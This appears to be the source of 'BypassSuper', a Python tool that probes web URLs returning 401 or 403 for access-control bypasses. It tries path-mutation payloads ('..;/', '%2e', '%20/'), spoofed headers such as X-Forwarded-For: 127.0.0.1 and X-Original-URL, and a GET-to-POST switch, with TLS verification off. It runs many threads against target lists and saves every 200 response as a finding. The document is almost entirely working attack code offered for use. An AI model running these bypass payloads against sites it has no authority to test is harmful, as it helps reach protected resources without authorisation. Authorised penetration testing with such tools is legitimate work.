#!/usr/bin/python3
# -*- coding: UTF-8 -*-


__author__ = "summersec"

import time
import csv
import threading
import optparse
import sys
import logging
import http.client
from urllib import parse
from queue import Queue
import requests
import urllib3

# 关闭警告
urllib3.disable_warnings()

times = time.localtime()
# 保存结果文件名 -f/--file的时候用到
filename = str("./result/" +
               str(times.tm_year) + str(times.tm_mon) + str(times.tm_mday) + str(times.tm_hour) + str(
    times.tm_min) + str(
    times.tm_sec) + "-result.csv")
# 保存日志文件名
logname = str("./log/" +
              str(times.tm_year) + str(times.tm_mon) + str(times.tm_mday) + str(times.tm_hour) + str(
    times.tm_min) + str(
    times.tm_sec) + "-log.log")

# 全局处理
# 保存扫描日志
# 日志处理

httpclient_logger = logging.getLogger("http.client")
logging.basicConfig(level=logging.DEBUG,  # 控制台打印的日志级别
                    filename=logname,
                    filemode='w'  ##模式，有w和a，w就是写模式，每次都会重新写日志，覆盖之前的日志
                    # a是追加模式，默认如果不写的话，就是追加模式
                    # format=
                    # '%(asctime)s - %(pathname)s[line:%(lineno)d] - %(levelname)s: %(message)s'
                    # # 日志格式
                    )


def httpclient_logging_patch(httpclient_logger, level=logging.DEBUG):
    # self.httpclient_logger = httpclinet_logger

    # """Enable HTTPConnection debug logging to the logging framework"""
    def httpclient_log(*args):
        httpclient_logger.log(level, " ".join(args))

    # mask the print() built-in in the http.client module to use
    # logging instead
    http.client.print = httpclient_log
    # enable debugging
    http.client.HTTPConnection.debuglevel = 1


# 继承式多线程
class MyThread(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.q = queue
        # self.thread_stop = False

    # start()方法启动线程将自动调用 run()方法
    def run(self):  # 线程执行体
        # 从队列取出数据，每次一条，多个线程同时取，直到取空
        # print(str(self.q.empty()) + " self.q.empty()")
        while not self.q.empty():
            url = self.q.get()
            try:
                # print("self.q.get(): " + url)
                # print(self.thread_stop)
                BypassSuper().Req(url)
            except Exception as e:
                print(e)
                # self.thread_stop = True
            finally:
                pass


class BypassSuper:
    # def __init__(self):
    #     print(time.asctime() + " Init BypassSuper!")

    def result(self):
        # filename = file + "-result.csv"
        # logname = file + "-log.log"
        # print(filename)
        # filename = self.filename
        with open(mode="a+", file=filename, encoding="utf-8", newline="") as file:
            f_csv = csv.writer(file)
            f_csv.writerow(['PreURL', "lastURL", "respone", "payload"])
            file.close()

    # 请求url
    def Req(self, url):

        try:
            print(time.asctime() + " Determining the URL: " + url + " status code! ")
            httpclient_logging_patch(httpclient_logger)
            req = requests.request(method="GET", url=url, timeout=5, allow_redirects=False, verify=False, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'

            })
            print(time.asctime() + " The URL of status_code is " + str(req.status_code))
        except Exception as e:
            print(time.asctime() + " something is error!")
            print(time.asctime() + " Exception: " + str(e))
        finally:
            pass

        try:
            if 400 <= req.status_code < 404:
                # print(time.asctime() + " The URL of status_code is " + str(req.status_code))
                print(time.asctime() + " The Scanner is running! ")
                httpclient_logging_patch(httpclient_logger)
                req2 = requests.request(method="POST", url=url, timeout=5, verify=False, allow_redirects=False, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'

                })
                if req2.status_code == 200:
                    # print(req)
                    print(time.asctime() + " " + url + "has the vuls! payload : get to post !")
                    self.SaveResult(Preurl=url, lasturl="post", respone=req2.text, payload="get to post")
                self.Scan(url)
            if 400 > req.status_code >= 404:
                print(time.asctime() + " The URL of status_code is " + str(req.status_code))
                pass
        except Exception as e:
            print(time.asctime() + " something is error!")
            print(time.asctime() + " Exception: " + str(e))
        finally:
            pass

    # 保存扫描结果
    def SaveResult(self, Preurl, lasturl, respone, payload):
        # print(self.filename)
        with open(mode="a+", file=filename, encoding="utf-8", newline="") as file:
            f_csv = csv.writer(file)
            f_csv.writerow([Preurl, lasturl, respone, payload])
            print(time.asctime() + " save is secuss!")
            file.close()

    # 发起扫描
    def Scan(self, url):
        print(time.asctime() + " Scan: " + url)
        result = self.UrlParse(url=url)
        LastPath = result[3]
        Param = result[5]
        Upath = result[1]
        UHost = result[2]
        PreviousPath = result[4]

        payloads = ["%2e" + LastPath,
                    "%2e/" + LastPath,
                    LastPath + "/.",
                    "./" + LastPath + "/./",
                    "%20/" + LastPath,
                    LastPath + "%20/",
                    "%20" + LastPath + "%20/",
                    LastPath + "..;/",
                    LastPath + "?",
                    LastPath + "??",
                    "/" + LastPath + "//",
                    LastPath + "/",
                    LastPath + "/.randomstring",
                    LastPath + ".json"
                    ]
        hpayloads1 = ["X-Custom-IP-Authorization",
                      "X-Host",
                      "X-Client-IP",
                      "X-Forwarded-For",
                      "X-Originating-IP",
                      "X-Forwared-Host",
                      "X-Remote-IP",
                      "X-Http-Destinationurl",
                      "Client-IP",
                      "Proxy-Host",
                      "Request-Uri",
                      "X-Forwarded-By",
                      "X-Forwarded",
                      "X-Forwarded-For-Original",
                      "X-Forwarded-Server",
                      "X-Forwarder-For",
                      "X-Forward-For",
                      "Base-Url",
                      "Http-Url",
                      "Proxy-Url",
                      "Redirect",
                      "Real-Ip",
                      "Referer",
                      "Referrer",
                      "Refferer",
                      "Uri",
                      "Url",
                      "X-Http-Host-Override",
                      "X-Original-Remote-Addr",
                      "X-Original-Url",
                      "X-Proxy-Url",
                      "X-Rewrite-Url",
                      "X-Real-Ip",
                      "X-Remote-Addr",
                      "X-Originating-IP"
                      ]

        hpayloads2 = [
            "X-Rewrite-URL",
            "X-Original-URL",
            "Referer",
            "RefererHURl",
            "Url",
            "UrlHURl",
            "Uri",
            "UriHURl",
            "X-Proxy-Url",
            "Http-Url",
            "Proxy-Url",
            "Base-Url",
            "Proxy-Url",
            "RefererRurl"
        ]

        hspayloads1 = [
            "X-Rewrite-URL",
            "X-Original-URL",
            "X-Rewrite-URL",
            "X-Forwarded-Path",
            "X-Proxy-Url",
            "Http-Url",
            "Proxy-Url",
            "Base-Url",
            "Proxy-Url",
            "Url",
            "Uri"
        ]

        hspayloads2 = [
            "Uri",
            "Url",
            "Referer"
        ]

        payload1 = "127.0.0.1"
        # 特殊payload
        payload2 = "Content-Length"
        payload3 = "0"
        payload4 = "X-Frame-Options"
        payload5 = "Allow"

        print(time.asctime() + " The first scanning method is running!")
        if Upath != "":

            for p in payloads:
                # print(p)
                self.ScanOne(url, UHost, PreviousPath=PreviousPath, payload=p)
            print(time.asctime() + " The second scanning method is running!")
            for hp in hpayloads1:
                self.ScanTwo(url=url, payload1=hp, payload2=payload1)

            for hp2 in hpayloads2:
                self.ScanTwo(url=url, payload1=hp2, payload2="/" + LastPath)
                self.ScanTwo(url=url, payload1=hp2, payload2=Upath)

            self.ScanTwo(url=url, payload1=payload2, payload2=payload3)
            self.ScanTwo(url=url, payload1=payload4, payload2=payload5)
            print(time.asctime() + " The third scanning method is running!")
            for hsp1 in hspayloads1:
                # print("hspayloads1")
                self.ScanThree(url=url, host=UHost, payload1=hsp1, payload2=Upath)
        else:
            for hsp1 in hspayloads1:
                # print("hspayloads1")
                self.ScanThree(url=url, host=UHost, payload1=hsp1, payload2=url)
            for hsp2 in hspayloads2:
                # print("hspayloads2")
                self.ScanThree(url=url, host=UHost, payload1=hsp2, payload2=url)

    # 第一种方式payload
    def ScanOne(self, url, Uhost, PreviousPath, payload):
        lastU = Uhost + PreviousPath + payload
        print(time.asctime() + " Scanning: " + url + " with the payload (" + payload + ")")
        try:
            httpclient_logging_patch(httpclient_logger)
            req = requests.get(url=lastU, verify=False, allow_redirects=False, timeout=5, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'

            })
            if req.status_code == 200:
                print(time.asctime() + " " + url + " has the vuls! payload : " + payload)
                self.SaveResult(Preurl=url, lasturl=lastU, respone=req.text, payload=payload)
            else:
                print(time.asctime() + " " + url + " donot have the vuls! payload : " + payload)
        except Exception as e:

            print(time.asctime() + " something is error! ")
            print(time.asctime() + " Scanning: " + url + " with the payload (" + payload + ")")
            print(time.asctime() + " Exception: " + str(e))
        finally:

            pass

    # 第二种方式payload
    def ScanTwo(self, url, payload1, payload2):

        payload = payload1 + ": " + payload2
        print(time.asctime() + " Scanning: " + url + " with the payload (" + payload + ")")
        try:
            httpclient_logging_patch(httpclient_logger)
            req = requests.get(url=url, verify=False, allow_redirects=False, timeout=5, headers={
                payload1: payload2,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'

            })
            if req.status_code == 200:
                print(time.asctime() + " " + url + " has the vuls! payload : " + payload)
                self.SaveResult(Preurl=url, lasturl=url, respone=req.text, payload=payload)
            else:
                print(time.asctime() + " " + url + " donot have the vuls! payload : " + payload)
        except Exception as e:

            print(time.asctime() + " something is error! ")
            print(time.asctime() + " Scanning: " + url + " with the payload (" + payload + ")")
            print(time.asctime() + " Exception: " + str(e))
        finally:

            pass

    # 第三种方式payload
    def ScanThree(self, url, host, payload1, payload2):

        payload = payload1 + ": " + payload2
        # print(payload)
        print(time.asctime() + " Scanning: " + url + " with the payload (" + payload + ")")
        try:
            httpclient_logging_patch(httpclient_logger)
            req = requests.get(url=host, verify=False, allow_redirects=False, timeout=5, headers={
                payload1: payload2,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'

            })
            if req.status_code == 200:
                print(time.asctime() + " " + url + " has the vuls! payload : " + payload)
                self.SaveResult(Preurl=url, lasturl=host, respone=req.text, payload=payload)
            else:
                print(time.asctime() + " " + url + " donot have the vuls! payload : " + payload)
        except Exception as e:

            print(time.asctime() + " something is error! ")
            print(time.asctime() + " Scanning: " + url + " with the payload (" + payload + ")")
            print(time.asctime() + " Exception: " + str(e))
        finally:
            pass

    # url解析
    def UrlParse(self, url):
        url = url  # 整个URL
        result = parse.urlparse(url)
        Upath = result.path  # 完整的Path
        host = str(result.netloc).split(':')[0]  # 主机
        Uhost = result.scheme + "://" + result.netloc  # 主机
        if Upath != "":
            LastPath = str(Upath).split('/')[-1]  # 最后一个Path
            PreviousPath = str(Upath).split(LastPath)[0]  # 之前的Path
        else:
            LastPath = ""
            PreviousPath = ""
        Param = result.query  # 参数

        return [url, Upath, Uhost, LastPath, PreviousPath, Param, host]

    # 从文件中读取url
    def URLS(self, file, nums):
        self.urlQueue = Queue()
        with open(file=file, mode="r", encoding="utf-8") as u:
            urls = u.readlines()
            u.close()
        cout = 0
        for url in urls:
            cout = cout + 1
            u = url.strip("\r\n").strip()
            print(time.asctime() + " Reading The URLs: " + u)
            self.urlQueue.put(u)
        print(time.asctime() + " The file is read, there are " + str(cout) + " URLs in total")
        if cout >= nums:
            self.Threads(nums=nums)
        else:
            print(
                time.asctime() + " Targets must >= threads ! Targets is " + str(cout) + " And Threads is " + str(nums))
            sys.exit(0)

    # 多线程并发请求
    def Threads(self, nums):
        # print("nums is " + str(nums))
        for i in range(nums):
            t = MyThread(self.urlQueue)
            t.start()

    def main(self):
        print("""
        
                ______                            _____                       
                | ___ \                          /  ___|                      
                | |_/ /_   _ _ __   __ _ ___ ___ \ `--. _   _ _ __   ___ _ __ 
                | ___ \ | | | '_ \ / _` / __/ __| `--. \ | | | '_ \ / _ \ '__|
                | |_/ / |_| | |_) | (_| \__ \__ \/\__/ / |_| | |_) |  __/ |   
                \____/ \__, | .__/ \__,_|___/___/\____/ \__,_| .__/ \___|_|   
                        __/ | |                              | |              
                       |___/|_|                              |_|     
                    author: summersec
                    version: 1.0
                    Github: https://github.com/SummerSec/BypassSuper         
        """)
        parse = optparse.OptionParser()
        parse.add_option('-u', '--url', dest='url', help='Please Enter the Target Site! http://www.baidu.com')
        parse.add_option('-t', '--threads', dest='threads', type=int, default=20,
                         help='Please Enter the Threading Nums! Threads Default is 20!')
        parse.add_option('-f', '--file', dest='file', type=str, help='Targets From File! Targets must >= threads !')
        (options, args) = parse.parse_args()

        if options.url == None and options.file == None:
            parse.print_help()
            sys.exit(0)
        elif options.url != None:
            url = options.url
            self.UrlParse(url=url)

            self.result()
            self.Req(url)


        elif options.file != None:
            file = options.file
            t = options.threads
            self.result()
            self.URLS(file=file, nums=t)

        else:
            print(time.asctime() + " something is error!")
            pass


if __name__ == '__main__':
    BypassSuper().main()
